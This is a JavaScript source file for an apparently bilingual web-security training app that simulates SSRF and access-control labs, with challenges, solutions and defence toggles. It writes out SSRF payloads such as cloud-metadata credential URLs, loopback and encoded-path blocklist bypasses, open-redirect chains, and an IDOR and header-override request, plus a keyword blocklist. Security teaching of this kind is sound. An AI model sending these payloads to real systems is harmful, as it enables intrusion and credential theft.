import { L, decodeOnce, parseReq, verdict } from './lib.js';

/* =============================================================== SSRF */
const ADMIN_PAGE = 'HTTP/1.1 200 OK\n\n<h1>Admin panel</h1>\nwiener  <a href="/admin/delete?username=wiener">Delete</a>\ncarlos  <a href="/admin/delete?username=carlos">Delete</a>';
const DELETED = (u) => `HTTP/1.1 302 Found\nLocation: /admin\n\nUser ${u} deleted`;
const STOCK_HOST = 'stock.shop.internal';

/** What the internal network answers. host is already normalised by URL(). */
function internal(host, port, path, query) {
  const isLoop = host === 'localhost' || host === '127.0.0.1';
  const adminHost = (isLoop && port === '80') || (host === '192.168.0.68' && port === '8080') || (host === '192.168.0.12' && port === '8080');
  if (host === STOCK_HOST) return { status: 200, body: 'HTTP/1.1 200 OK\n\n421 units' };
  if (host === '169.254.169.254') {
    if (path === '/latest/meta-data/' || path === '/latest/meta-data') return { status: 200, body: 'HTTP/1.1 200 OK\n\nami-id\nhostname\niam/\ninstance-id\nlocal-ipv4' };
    if (path === '/latest/meta-data/iam/security-credentials/') return { status: 200, body: 'HTTP/1.1 200 OK\n\nshop-ec2-role' };
    if (path === '/latest/meta-data/iam/security-credentials/shop-ec2-role') return { status: 200, cloud: true, body: 'HTTP/1.1 200 OK\n\n{\n  "AccessKeyId": "ASIA…EXAMPLE",\n  "SecretAccessKey": "wJalr…EXAMPLEKEY",\n  "Token": "IQoJb3Jp…",\n  "Expiration": "2026-11-26T18:00:00Z"\n}' };
    return { status: 404, body: 'HTTP/1.1 404 Not Found' };
  }
  if (adminHost) {
    if (path === '/admin') return { status: 200, admin: true, body: ADMIN_PAGE };
    if (path === '/admin/delete' && query.get('username')) return { status: 302, admin: true, deleted: query.get('username'), body: DELETED(query.get('username')) };
    return { status: 404, body: 'HTTP/1.1 404 Not Found' };
  }
  if (host === '192.168.0.1' && port === '8080') return { status: 404, body: 'HTTP/1.1 404 Not Found\n\n(router web UI)' };
  return { status: 0, body: L(`(no response: connection to ${host}:${port} refused or timed out)`, `（无响应：连接 ${host}:${port} 被拒绝或超时）`) };
}

/** Server-side fetch: the URL object normalises 127.1 / 2130706433 to 127.0.0.1; the back-end decodes the path once more. */
function ssrfFetch(raw) {
  let u;
  try {
    u = new URL(raw);
  } catch {
    return { err: true, log: [L('URL parse error', 'URL 解析错误')], body: 'HTTP/1.1 400 "Invalid URL"' };
  }
  const port = u.port || (u.protocol === 'https:' ? '443' : '80');
  const path = decodeOnce(u.pathname);
  const r = internal(u.hostname, port, path, u.searchParams);
  return { ...r, host: u.hostname, port, path, log: [L(`server fetches ${u.protocol}//${u.hostname}:${port}${path}${u.search}`, `服务器请求 ${u.protocol}//${u.hostname}:${port}${path}${u.search}`)] };
}

const stockReq = (v) => `POST /product/stock HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nstockApi=${encodeURIComponent(v)}`;
const ALLOW = { label: L('Outbound URL', '出站 URL'), off: L('Any URL', '任意 URL'), on: L(`Allowlist ${STOCK_HOST}`, `只允许 ${STOCK_HOST}`) };
const allowlisted = (raw) => {
  try {
    return new URL(raw).hostname === STOCK_HOST;
  } catch {
    return false;
  }
};
const showBody = (b) => b;

function ssrfLab(def, extra = {}) {
  return {
    fields: [{ id: 'u', label: L('stockApi parameter', 'stockApi 参数'), default: def }],
    defense: ALLOW,
    run({ values, defended }) {
      const request = stockReq(values.u);
      if (defended && !allowlisted(values.u)) return { request, log: [L(`🛡 host is not ${STOCK_HOST}: request refused before any fetch`, `🛡 主机不是 ${STOCK_HOST}：在发出请求前就拒绝`)], response: 'HTTP/1.1 400 "External stock check host not allowed"', ...verdict(false, 'Only the stock service can be reached.', '只能访问库存服务。') };
      const r = ssrfFetch(values.u);
      const bad = r.admin || r.cloud;
      return { request, log: r.log, response: showBody(r.body), ...(bad ? verdict(true, r.deleted ? `The server deleted ${r.deleted} on your behalf.` : r.cloud ? 'Cloud credentials for the server’s own role.' : 'An internal-only admin panel, served to you through the app.', r.deleted ? `服务器替你删除了 ${r.deleted}。` : r.cloud ? '拿到了服务器自身角色的云凭证。' : '一个只对内网开放的管理面板，通过应用被送到了你面前。') : { verdict: 'neutral', message: L(r.status ? 'A response, but nothing sensitive.' : 'Nothing listening there.', r.status ? '有响应，但没有敏感内容。' : '那里没有服务在监听。') }) };
    },
    ...extra,
  };
}

const BLOCK = /localhost|127\.0\.0\.1|admin/i;

const ssrf = {
  variants: [
    {
      id: 'local',
      title: L('Against the server itself', '攻击服务器自身'),
      summary: L('The app fetches a URL you supply. Point it at localhost: requests from the server to itself often skip authentication because “only we can reach it”.', '应用会请求你提供的 URL。把它指向 localhost：服务器访问自己时往往跳过认证，因为“只有我们自己能访问到”。'),
      lab: ssrfLab(`http://${STOCK_HOST}/product/stock/check?productId=1`, {
        presets: [
          { label: L('Normal', '正常'), values: { u: `http://${STOCK_HOST}/product/stock/check?productId=1` } },
          { label: 'localhost/admin', values: { u: 'http://localhost/admin' } },
          { label: L('Delete carlos', '删除 carlos'), values: { u: 'http://localhost/admin/delete?username=carlos' } },
        ],
      }),
      takeaway: L('“Trusted because it comes from localhost” is the root cause. Authenticate internal endpoints too.', '“来自 localhost 所以可信”才是根源。内部接口同样需要认证。'),
    },
    {
      id: 'internal',
      title: L('Back-end network', '后端内网'),
      summary: L('The server sits inside a private network you cannot reach directly. Through SSRF you can scan it (one IP or port per request) and talk to systems that were never meant to face the internet.', '服务器位于你无法直接访问的私有网络中。借助 SSRF，你可以扫描这个网络（每个请求测一个 IP 或端口），与那些本不该暴露在互联网上的系统对话。'),
      lab: ssrfLab('http://192.168.0.1:8080/admin', {
        presets: [
          { label: '192.168.0.1', values: { u: 'http://192.168.0.1:8080/admin' } },
          { label: '192.168.0.68', values: { u: 'http://192.168.0.68:8080/admin' } },
          { label: '192.168.0.200', values: { u: 'http://192.168.0.200:8080/admin' } },
        ],
      }),
      takeaway: L('Different errors and timings (refused vs 404 vs timeout) let attackers map the network.', '不同的错误和耗时（拒绝、404、超时）足以让攻击者绘出内网地图。'),
    },
    {
      id: 'cloud',
      title: L('Cloud metadata', '云元数据'),
      summary: L('Cloud VMs expose a metadata service at 169.254.169.254. With the old IMDSv1, a simple GET returns temporary credentials for the machine’s IAM role.', '云虚拟机在 169.254.169.254 上提供元数据服务。在旧版 IMDSv1 下，一个简单的 GET 请求就能拿到这台机器 IAM 角色的临时凭证。'),
      lab: {
        fields: [{ id: 'u', label: L('stockApi parameter', 'stockApi 参数'), default: 'http://169.254.169.254/latest/meta-data/' }],
        presets: [
          { label: 'meta-data/', values: { u: 'http://169.254.169.254/latest/meta-data/' } },
          { label: 'security-credentials/', values: { u: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' } },
          { label: 'shop-ec2-role', values: { u: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-ec2-role' } },
        ],
        defense: { label: L('Metadata service', '元数据服务'), off: 'IMDSv1', on: L('IMDSv2 (token required)', 'IMDSv2（需要令牌）') },
        run({ values, defended }) {
          const request = stockReq(values.u);
          const r = ssrfFetch(values.u);
          if (defended && r.host === '169.254.169.254') return { request, log: [...r.log, L('🛡 IMDSv2 needs a PUT to get a session token, then a header. A plain GET via SSRF gets nothing.', '🛡 IMDSv2 需要先用 PUT 获取会话令牌，再带上请求头。通过 SSRF 发出的普通 GET 什么也拿不到。')], response: 'HTTP/1.1 401 Unauthorized', ...verdict(false, 'The metadata service refuses token-less requests.', '元数据服务拒绝不带令牌的请求。') };
          return { request, log: r.log, response: showBody(r.body), ...(r.cloud ? verdict(true, 'With these keys the attacker can call cloud APIs as the server.', '拿着这些密钥，攻击者就能以服务器的身份调用云 API。') : { verdict: 'neutral', message: L('Browse the tree: iam/ → security-credentials/ → role name.', '顺着目录走：iam/ → security-credentials/ → 角色名。') }) };
        },
      },
      takeaway: L('This is how the 2019 Capital One breach worked (see below). Enforce IMDSv2 and keep role permissions minimal.', '2019 年 Capital One 泄露事件就是这样发生的（见下文）。强制使用 IMDSv2，并让角色权限最小化。'),
    },
    {
      id: 'blocklist',
      title: L('Blocklist bypass', '绕过黑名单'),
      summary: L('Some apps block strings like “localhost”, “127.0.0.1” or “admin”. But an IP address has many spellings, and the back-end may decode the URL again after the check.', '有些应用会屏蔽“localhost”“127.0.0.1”或“admin”这样的字符串。但一个 IP 地址有很多种写法，而且后端可能在检查之后再解码一次 URL。'),
      lab: {
        fields: [{ id: 'u', label: L('stockApi (blocklist: localhost, 127.0.0.1, admin)', 'stockApi（黑名单：localhost、127.0.0.1、admin）'), default: 'http://127.1/' }],
        presets: [
          { label: '127.0.0.1', values: { u: 'http://127.0.0.1/admin' } },
          { label: '127.1', values: { u: 'http://127.1/' } },
          { label: '2130706433', values: { u: 'http://2130706433/' } },
          { label: '127.1/%61dmin', values: { u: 'http://127.1/%61dmin' } },
        ],
        defense: { label: L('Filter', '过滤方式'), off: L('Blocklist', '黑名单'), on: L('Allowlist', '白名单') },
        run({ values, defended }) {
          const request = stockReq(values.u);
          if (defended && !allowlisted(values.u)) return { request, log: [L('🛡 not on the allowlist', '🛡 不在白名单中')], response: 'HTTP/1.1 400', ...verdict(false, 'An allowlist doesn’t care how you spell the IP.', '白名单不在乎你怎么拼写 IP。') };
          if (!defended && BLOCK.test(values.u)) return { request, log: [L(`🛡 blocklist matched “${BLOCK.exec(values.u)[0]}”`, `🛡 命中黑名单“${BLOCK.exec(values.u)[0]}”`)], response: 'HTTP/1.1 400 "External stock check blocked for security reasons"', verdict: 'neutral', message: L('Blocked. Try another spelling.', '被拦截了。换一种写法试试。') };
          const r = ssrfFetch(values.u);
          const loop = r.host === '127.0.0.1';
          return { request, log: [...(r.log || []), loop && !/^127\.0\.0\.1$/.test(new URL(values.u).hostname) ? L('URL parser normalised the host to 127.0.0.1', 'URL 解析器把主机规范化成了 127.0.0.1') : ''].filter(Boolean), response: showBody(loop && r.status === 404 && r.path === '/' ? 'HTTP/1.1 200 OK\n\n<h1>Home</h1>' : r.body), ...(r.admin ? verdict(true, 'Passed the blocklist and reached /admin.', '绕过了黑名单，访问到了 /admin。') : loop ? { verdict: 'neutral', message: L('You reached localhost. Now get “admin” past the filter.', '你已经到达 localhost。现在让“admin”通过过滤器。') } : { verdict: 'neutral', message: L('Not localhost.', '不是 localhost。') }) };
        },
      },
      takeaway: L('127.1, 2130706433, 0x7f000001 and [::1] all reach loopback. Blocklists can’t list every spelling.', '127.1、2130706433、0x7f000001 和 [::1] 都指向回环地址。黑名单列不完所有写法。'),
    },
    {
      id: 'redirect',
      title: L('Via an open redirect', '借助开放重定向'),
      summary: L('If the app only allows URLs on its own site, look for an open redirect on that site. The server follows the redirect to wherever you point it.', '如果应用只允许本站的 URL，就去找本站的开放重定向。服务器会跟随重定向，去往你指定的任何地方。'),
      lab: {
        fields: [{ id: 'u', label: L('stockApi (must be a path on this site)', 'stockApi（必须是本站路径）'), default: '/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin' }],
        presets: [
          { label: L('Direct URL', '直接 URL'), values: { u: 'http://192.168.0.12:8080/admin' } },
          { label: L('Normal next product', '正常的下一个商品'), values: { u: '/product/nextProduct?currentProductId=1&path=/product?productId=2' } },
          { label: L('Redirect chain', '重定向链'), values: { u: '/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin' } },
        ],
        defense: { label: L('nextProduct redirect', 'nextProduct 重定向'), off: L('Any path', '任意 path'), on: L('Relative paths only', '只允许相对路径') },
        run({ values, defended }) {
          const request = stockReq(values.u);
          if (!values.u.startsWith('/')) return { request, log: [L('🛡 stockApi must start with /', '🛡 stockApi 必须以 / 开头')], response: 'HTTP/1.1 400 "Invalid stock API"', verdict: 'neutral', message: L('Absolute URLs are refused. Find a redirect on this site.', '绝对 URL 被拒绝了。去找本站的重定向。') };
          const u = new URL(values.u, 'http://shop.example');
          if (u.pathname !== '/product/nextProduct') return { request, log: [L(`server fetches http://shop.example${values.u}`, `服务器请求 http://shop.example${values.u}`)], response: 'HTTP/1.1 404', verdict: 'neutral', message: L('Nothing useful there.', '那里没有有用的东西。') };
          const target = u.searchParams.get('path') || '/';
          const log = [L(`server fetches http://shop.example${values.u}`, `服务器请求 http://shop.example${values.u}`), `← 302 Location: ${target}`];
          if (defended && !/^\/(?!\/)/.test(target)) return { request, log: [...log, L('🛡 redirect target is absolute: refused', '🛡 重定向目标是绝对地址：拒绝')], response: 'HTTP/1.1 400', ...verdict(false, 'No redirect off-site, so no chain.', '不能重定向到站外，链条就断了。') };
          if (target.startsWith('/')) return { request, log, response: 'HTTP/1.1 200 OK\n\n(product page)', verdict: 'neutral', message: L('A normal redirect.', '正常的重定向。') };
          const r = ssrfFetch(target);
          return { request, log: [...log, ...(r.log || [])], response: showBody(r.body), ...(r.admin ? verdict(true, 'The filter checked the first URL; the redirect took the server somewhere else.', '过滤器检查的是第一个 URL，而重定向把服务器带去了别处。') : { verdict: 'neutral', message: L('Redirect followed.', '已跟随重定向。') }) };
        },
      },
      takeaway: L('Server-side HTTP clients should not follow redirects, or must re-validate each hop.', '服务端 HTTP 客户端不应跟随重定向，或者必须对每一跳重新校验。'),
    },
    {
      id: 'blind',
      title: L('Blind SSRF (out-of-band)', '盲 SSRF（带外）'),
      summary: L('Sometimes the server fetches a URL but never shows you the result, e.g. an analytics tool that visits the Referer header. Detect it with a domain you control and watch for DNS or HTTP hits.', '有时服务器会请求某个 URL，却从不把结果给你看，比如会访问 Referer 头的分析工具。用你控制的域名去探测，观察是否出现 DNS 或 HTTP 访问。'),
      lab: {
        fields: [{ id: 'r', label: 'Referer', default: 'https://k3x9.oast.example/' }],
        presets: [
          { label: L('Normal', '正常'), values: { r: 'https://www.google.com/' } },
          { label: L('Your listener', '你的监听域名'), values: { r: 'https://k3x9.oast.example/' } },
        ],
        defense: { label: L('Analytics', '分析工具'), off: L('Fetches Referer', '会请求 Referer'), on: L('Logs Referer only', '只记录 Referer') },
        run({ values, defended }) {
          const request = `GET /product?productId=1 HTTP/1.1\nReferer: ${values.r}`;
          let host = '';
          try {
            host = new URL(values.r).hostname;
          } catch {
            host = '';
          }
          if (defended) return { request, log: [L('Referer written to log as text', 'Referer 作为文本写入日志')], response: 'HTTP/1.1 200 OK\n\n(product page)', ...verdict(false, 'Nothing is fetched, so nothing calls home.', '没有发出任何请求，也就不会“回连”。') };
          const oob = host.endsWith('.oast.example');
          return { request, log: [L(`analytics fetches ${values.r}`, `分析工具请求了 ${values.r}`), oob ? L(`📡 your listener: DNS lookup of ${host} from 203.0.113.7, then GET /`, `📡 你的监听器：来自 203.0.113.7 的 ${host} DNS 查询，随后是 GET /`) : ''].filter(Boolean), response: 'HTTP/1.1 200 OK\n\n(product page, identical every time)', ...(oob ? verdict(true, 'The page looked normal, but your listener proves the server makes requests for you.', '页面看起来一切正常，但你的监听器证明了服务器会替你发请求。') : { verdict: 'neutral', message: L('Same page. You can’t tell anything from the response.', '页面一样。从响应里看不出任何东西。') }) };
        },
      },
      takeaway: L('Out-of-band tools (Burp Collaborator, interactsh) are how blind bugs get found.', '带外工具（Burp Collaborator、interactsh）是发现盲漏洞的方法。'),
    },
  ],
  challenges: [
    {
      title: L('Find the hidden admin host', '找到隐藏的管理主机'),
      goal: L('An admin panel runs on port 8080 somewhere in 192.168.0.0/24. Use the stock checker to find it and delete the user carlos.', '某个管理面板运行在 192.168.0.0/24 内某台主机的 8080 端口上。利用库存查询功能找到它，并删除用户 carlos。'),
      fields: [{ id: 'u', label: 'stockApi', default: 'http://192.168.0.1:8080/admin' }],
      run({ u }) {
        const r = ssrfFetch(u);
        return { log: r.log, response: r.body, r };
      },
      check: (v, o) => o.r.deleted === 'carlos' && o.r.host.startsWith('192.168.0.'),
      hint: L('In a real test you would use Burp Intruder on the last octet. Shortcut: the host is between .60 and .70. Then follow the Delete link.', '真实测试中你会用 Burp Intruder 遍历最后一段。捷径：主机在 .60 到 .70 之间。找到后，照着 Delete 链接去做。'),
      solution: 'http://192.168.0.68:8080/admin/delete?username=carlos',
      explain: L('Every internal host is one request away once the server fetches URLs for you. Refused connections, 404s and the admin page all look different, which is what makes scanning possible.', '一旦服务器会替你请求 URL，每台内网主机都只差一个请求。连接被拒、404 和管理页面的响应各不相同，这正是扫描能成立的原因。'),
    },
    {
      title: L('Beat the blocklist', '击败黑名单'),
      goal: L('The admin panel is on http://localhost/admin. The app rejects any stockApi containing “localhost”, “127.0.0.1” or “admin” (case-insensitive). Delete carlos anyway.', '管理面板在 http://localhost/admin。应用会拒绝任何包含“localhost”“127.0.0.1”或“admin”（不区分大小写）的 stockApi。照样删除 carlos。'),
      fields: [{ id: 'u', label: 'stockApi', default: 'http://localhost/admin/delete?username=carlos' }],
      run({ u }) {
        if (BLOCK.test(u)) return { log: [L(`🛡 blocklist matched “${BLOCK.exec(u)[0]}”`, `🛡 命中黑名单“${BLOCK.exec(u)[0]}”`)], response: 'HTTP/1.1 400 "External stock check blocked for security reasons"', r: {} };
        const r = ssrfFetch(u);
        return { log: r.log, response: r.body, r };
      },
      check: (v, o) => o.r.deleted === 'carlos',
      hint: L('Two problems: spell 127.0.0.1 differently, and hide “admin” from the filter. The back-end URL-decodes the path one more time.', '两个问题：换一种方式写 127.0.0.1，以及让过滤器看不到“admin”。后端会对路径再做一次 URL 解码。'),
      solution: 'http://127.1/%61dmin/delete?username=carlos',
      explain: L('127.1 is short for 127.0.0.1, and %61 is “a”. The filter saw neither, but the URL parser and the back-end did. In a real form body you would double-encode it (%2561), since the app decodes the parameter once on arrival.', '127.1 是 127.0.0.1 的简写，%61 就是“a”。过滤器两者都没认出来，但 URL 解析器和后端认出来了。在真实的表单请求体里你需要双重编码（%2561），因为应用在接收参数时已经解码了一次。'),
    },
    {
      title: L('Chain an open redirect', '串联开放重定向'),
      goal: L('stockApi must now be a path on this site (start with /). The admin panel is at http://192.168.0.12:8080/admin. The site has /product/nextProduct?currentProductId=1&path=… which redirects. Delete carlos.', 'stockApi 现在必须是本站路径（以 / 开头）。管理面板位于 http://192.168.0.12:8080/admin。本站有一个会重定向的 /product/nextProduct?currentProductId=1&path=…。删除 carlos。'),
      fields: [{ id: 'u', label: 'stockApi', default: '/product/stock/check?productId=1' }],
      run({ u }) {
        if (!u.startsWith('/')) return { log: [L('🛡 stockApi must start with /', '🛡 stockApi 必须以 / 开头')], response: 'HTTP/1.1 400 "Invalid stock API"', r: {} };
        const x = new URL(u, 'http://shop.example');
        if (x.pathname === '/product/stock/check') return { log: ['GET http://shop.example' + u], response: 'HTTP/1.1 200 OK\n\n421 units', r: {} };
        if (x.pathname !== '/product/nextProduct') return { log: ['GET http://shop.example' + u], response: 'HTTP/1.1 404', r: {} };
        const t = x.searchParams.get('path') || '/';
        if (t.startsWith('/')) return { log: ['GET http://shop.example' + u, `← 302 Location: ${t}`], response: 'HTTP/1.1 200 OK\n\n(product page)', r: {} };
        const r = ssrfFetch(t);
        return { log: ['GET http://shop.example' + u, `← 302 Location: ${t}`, ...(r.log || [])], response: r.body, r };
      },
      check: (v, o) => o.r.deleted === 'carlos' && o.r.host === '192.168.0.12',
      hint: L('Put the full admin URL (including /delete?username=carlos) in the path parameter of nextProduct.', '把完整的管理 URL（包括 /delete?username=carlos）放进 nextProduct 的 path 参数里。'),
      solution: '/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos',
      explain: L('The validation only looked at the first URL. The server’s HTTP client followed the 302 to the internal host. Fix either side: don’t follow redirects server-side, and don’t allow open redirects.', '校验只看了第一个 URL，而服务器的 HTTP 客户端跟随 302 去了内网主机。两边都可以修：服务端不跟随重定向，也不允许开放重定向。'),
    },
  ],
  cases: [
    { year: '2019', ref: L('Capital One', 'Capital One'), title: L('SSRF to cloud credentials', '从 SSRF 到云凭证'), what: L('An attacker abused a misconfigured web application firewall running on AWS to make requests to the EC2 metadata service, obtained the role’s temporary credentials, and used them to download data from S3. About 100 million people in the US and 6 million in Canada were affected.', '攻击者利用运行在 AWS 上、配置不当的 Web 应用防火墙，向 EC2 元数据服务发送请求，获取了角色的临时凭证，并用它们从 S3 下载数据。美国约 1 亿人、加拿大约 600 万人受到影响。'), lesson: L('SSRF + over-privileged cloud role = data breach. IMDSv2 and least privilege break the chain.', 'SSRF 加上权限过大的云角色，就等于数据泄露。IMDSv2 和最小权限能打断这条链。') },
    { year: '2021', ref: 'CVE-2021-26855', title: L('ProxyLogon (Microsoft Exchange)', 'ProxyLogon（Microsoft Exchange）'), what: L('A server-side request forgery in on-premises Exchange Server let unauthenticated attackers send requests as the Exchange server itself. Chained with a file-write bug (CVE-2021-27065), it gave code execution and was exploited at large scale.', '本地部署的 Exchange Server 中存在一个服务端请求伪造漏洞，未经认证的攻击者可以以 Exchange 服务器自身的身份发送请求。它与一个文件写入漏洞（CVE-2021-27065）串联后可实现代码执行，并遭到大规模利用。'), lesson: L('SSRF in a front-end proxy can bypass authentication for everything behind it.', '前端代理中的 SSRF，可以绕过其后所有服务的认证。') },
  ],
};

/* ====================================================== Access control */
const CARLOS_GUID = 'a1f4c0de-77b2-4e0c-9d31-5e2a8c6b9f10';
const WIENER_GUID = '3b9e2d41-0c6a-4f8e-b1d7-9a2c5e7f0b13';
const ACCOUNTS = {
  wiener: { guid: WIENER_GUID, key: 'Wq1nE7x3sLp0aZ', email: 'wiener@shop.example' },
  carlos: { guid: CARLOS_GUID, key: 'Ck9Tz4Hb2Rm6Yd', email: 'carlos@shop.example' },
};
const acct = (u) => `HTTP/1.1 200 OK\n\n<h1>My account</h1>\nUsername: ${u}\nEmail: ${ACCOUNTS[u].email}\nAPI key: ${ACCOUNTS[u].key}`;

/** The back-end admin routes: returns {status, body, deleted?, admin?}. */
function adminRoute(path, query) {
  if (path === '/admin') return { admin: true, body: ADMIN_PAGE };
  if (path === '/admin/delete') {
    const u = query.get('username');
    return u ? { admin: true, deleted: u, body: DELETED(u) } : { body: 'HTTP/1.1 400 "Missing parameter"' };
  }
  return null;
}

const ac = {
  variants: [
    {
      id: 'unprotected',
      title: L('Unprotected functionality', '未受保护的功能'),
      summary: L('The admin page has no check at all; the app just doesn’t link to it. But URLs leak, through robots.txt, JavaScript, or guessing.', '管理页面根本没有任何检查，应用只是没有链接到它。但 URL 会泄露：robots.txt、JavaScript，或者干脆被猜到。'),
      lab: {
        fields: [{ id: 'p', label: L('Path', '路径'), default: '/robots.txt' }],
        presets: [
          { label: '/robots.txt', values: { p: '/robots.txt' } },
          { label: '/administrator-panel', values: { p: '/administrator-panel' } },
        ],
        defense: { label: L('Protection', '保护方式'), off: L('Hidden URL', '隐藏 URL'), on: L('Server-side role check', '服务端角色检查') },
        run({ values, defended }) {
          const p = values.p.trim();
          const request = `GET ${p} HTTP/1.1\nCookie: session=wiener-7f3a`;
          if (p === '/robots.txt') return { request, log: [], response: 'HTTP/1.1 200 OK\n\nUser-agent: *\nDisallow: /administrator-panel', verdict: 'neutral', message: L('robots.txt is public and lists what the site wants hidden.', 'robots.txt 是公开的，偏偏列出了网站想隐藏的东西。') };
          if (p === '/administrator-panel') {
            if (defended) return { request, log: [L('🛡 session user wiener has role "user"', '🛡 会话用户 wiener 的角色是 "user"')], response: 'HTTP/1.1 403 Forbidden', ...verdict(false, 'Knowing the URL is not enough.', '知道 URL 也没用。') };
            return { request, log: [L('no check', '没有检查')], response: ADMIN_PAGE, ...verdict(true, 'Obscurity is not access control.', '隐藏不等于访问控制。') };
          }
          return { request, log: [], response: 'HTTP/1.1 404 Not Found', verdict: 'neutral', message: L('Not found.', '未找到。') };
        },
      },
    },
    {
      id: 'cookie',
      title: L('Role in a cookie', 'Cookie 里的角色'),
      summary: L('The app decides who is an admin from a value the user controls: a cookie, a hidden field, or a query parameter.', '应用根据用户可控的值来判断谁是管理员：Cookie、隐藏字段，或者查询参数。'),
      lab: {
        fields: [{ id: 'c', label: 'Cookie', default: 'session=wiener-7f3a; Admin=false' }],
        presets: [
          { label: 'Admin=false', values: { c: 'session=wiener-7f3a; Admin=false' } },
          { label: 'Admin=true', values: { c: 'session=wiener-7f3a; Admin=true' } },
        ],
        defense: { label: L('Role source', '角色来源'), off: L('Cookie', 'Cookie'), on: L('Server-side session', '服务端会话') },
        run({ values, defended }) {
          const r = parseReq(`GET /admin HTTP/1.1\nCookie: ${values.c}`);
          const request = `GET /admin HTTP/1.1\nCookie: ${values.c}`;
          const isAdmin = defended ? false : /^true$/i.test(r.cookies.Admin || '');
          return { request, log: [defended ? L('role looked up from session wiener-7f3a → user', '从会话 wiener-7f3a 查出角色 → user') : L(`role = cookie Admin (${r.cookies.Admin ?? 'missing'})`, `角色 = Cookie 中的 Admin（${r.cookies.Admin ?? '缺失'}）`)], response: isAdmin ? ADMIN_PAGE : 'HTTP/1.1 401 "Admin interface only available if logged in as an administrator"', ...(isAdmin ? verdict(true, 'You edited one cookie and became admin.', '你只改了一个 Cookie，就成了管理员。') : verdict(!defended && false, defended ? 'The cookie is ignored; the server knows who you are.' : 'Not admin (yet).', defended ? 'Cookie 被忽略了，服务器自己知道你是谁。' : '还不是管理员。')) };
        },
      },
    },
    {
      id: 'mass',
      title: L('Mass assignment', '批量赋值'),
      summary: L('An update endpoint copies every JSON field onto the user object, including ones the form never shows, like roleid.', '某个更新接口把 JSON 中的每个字段都复制到用户对象上，包括表单里从不显示的字段，比如 roleid。'),
      lab: {
        fields: [{ id: 'b', label: L('JSON body', 'JSON 请求体'), default: '{"email":"wiener@evil.example"}', rows: 2 }],
        presets: [
          { label: L('Email only', '只改邮箱'), values: { b: '{"email":"wiener@evil.example"}' } },
          { label: '+ roleid', values: { b: '{"email":"wiener@evil.example","roleid":2}' } },
        ],
        defense: { label: L('Binding', '字段绑定'), off: L('All fields', '所有字段'), on: L('Allowlist (email)', '白名单（仅 email）') },
        run({ values, defended }) {
          const request = `POST /my-account/change-email HTTP/1.1\nContent-Type: application/json\n\n${values.b}`;
          let j;
          try {
            j = JSON.parse(values.b);
          } catch {
            return { request, log: [], response: 'HTTP/1.1 400 "Invalid JSON"', verdict: 'neutral', message: L('Invalid JSON.', 'JSON 格式不对。') };
          }
          const user = { username: 'wiener', email: 'wiener@shop.example', apikey: ACCOUNTS.wiener.key, roleid: 1 };
          if (defended) user.email = j.email ?? user.email;
          else Object.assign(user, j, { username: 'wiener' });
          const esc = Number(user.roleid) === 2;
          return { request, log: [defended ? L('only email copied', '只复制了 email') : L('Object.assign(user, body)', 'Object.assign(user, body)')], response: `HTTP/1.1 200 OK\n\n${JSON.stringify(user, null, 2)}`, ...(esc ? verdict(true, 'roleid 2 = administrator. The response even told you the field name.', 'roleid 2 = 管理员。响应甚至把字段名告诉了你。') : defended ? verdict(false, 'Extra fields are dropped.', '多余的字段被丢弃了。') : { verdict: 'neutral', message: L('Look at the response: it shows a field you didn’t send.', '看看响应：里面有一个你没发送的字段。') }) };
        },
      },
      takeaway: L('If a response shows a field, try sending it back.', '如果响应里出现某个字段，试着把它发回去。'),
    },
    {
      id: 'idor',
      title: L('IDOR (horizontal)', 'IDOR（水平越权）'),
      summary: L('Insecure direct object reference: the app takes a user ID from the request and returns that user’s data without checking it is yours.', '不安全的直接对象引用：应用从请求中取用户 ID，直接返回该用户的数据，却不检查这是不是你的。'),
      lab: {
        fields: [{ id: 'id', label: 'id', default: 'carlos' }],
        presets: [
          { label: 'wiener', values: { id: 'wiener' } },
          { label: 'carlos', values: { id: 'carlos' } },
        ],
        defense: { label: L('Owner check', '所有者检查'), off: L('Trust id', '信任 id'), on: L('Use session user', '使用会话用户') },
        run({ values, defended }) {
          const id = values.id.trim();
          const request = `GET /my-account?id=${id} HTTP/1.1\nCookie: session=wiener-7f3a`;
          if (!ACCOUNTS[id]) return { request, log: [], response: 'HTTP/1.1 302 Found\nLocation: /login', verdict: 'neutral', message: L('No such user.', '没有这个用户。') };
          if (defended && id !== 'wiener') return { request, log: [L('🛡 id ≠ session user → 403', '🛡 id ≠ 会话用户 → 403')], response: 'HTTP/1.1 403 Forbidden', ...verdict(false, 'You only ever see your own account.', '你永远只能看到自己的账号。') };
          return { request, log: [], response: acct(id), ...(id !== 'wiener' ? verdict(true, 'Another user’s API key, by changing one parameter.', '只改了一个参数，就拿到了别人的 API 密钥。') : { verdict: 'neutral', message: L('Your own account.', '你自己的账号。') }) };
        },
      },
      takeaway: L('Unguessable IDs (GUIDs) slow attackers down but leak elsewhere. Always check ownership.', '不可猜测的 ID（GUID）能拖慢攻击者，但它们会在别处泄露。一定要检查所有权。'),
    },
    {
      id: 'xoriginal',
      title: L('URL override headers', 'URL 覆盖请求头'),
      summary: L('A front-end proxy blocks /admin by path, but the back-end framework honours X-Original-URL or X-Rewrite-URL. The two layers disagree on which URL is being requested.', '前端代理按路径拦截 /admin，但后端框架会认 X-Original-URL 或 X-Rewrite-URL。两层对“请求的是哪个 URL”看法不一致。'),
      lab: {
        fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 4, default: 'GET / HTTP/1.1\nHost: shop.example\nX-Original-URL: /admin' }],
        presets: [
          { label: 'GET /admin', values: { r: 'GET /admin HTTP/1.1\nHost: shop.example' } },
          { label: 'X-Original-URL', values: { r: 'GET / HTTP/1.1\nHost: shop.example\nX-Original-URL: /admin' } },
        ],
        defense: { label: L('Back-end', '后端'), off: L('Honours override headers', '认可覆盖头'), on: L('Ignores them + checks role', '忽略覆盖头 + 检查角色') },
        run({ values, defended }) {
          const r = parseReq(values.r);
          if (r.path.toLowerCase().startsWith('/admin')) return { request: values.r, log: [L('front-end: path starts with /admin → blocked', '前端：路径以 /admin 开头 → 拦截')], response: 'HTTP/1.1 403 "Access denied"', verdict: 'neutral', message: L('Blocked at the front-end.', '在前端被拦截了。') };
          const ov = r.headers['x-original-url'] || r.headers['x-rewrite-url'];
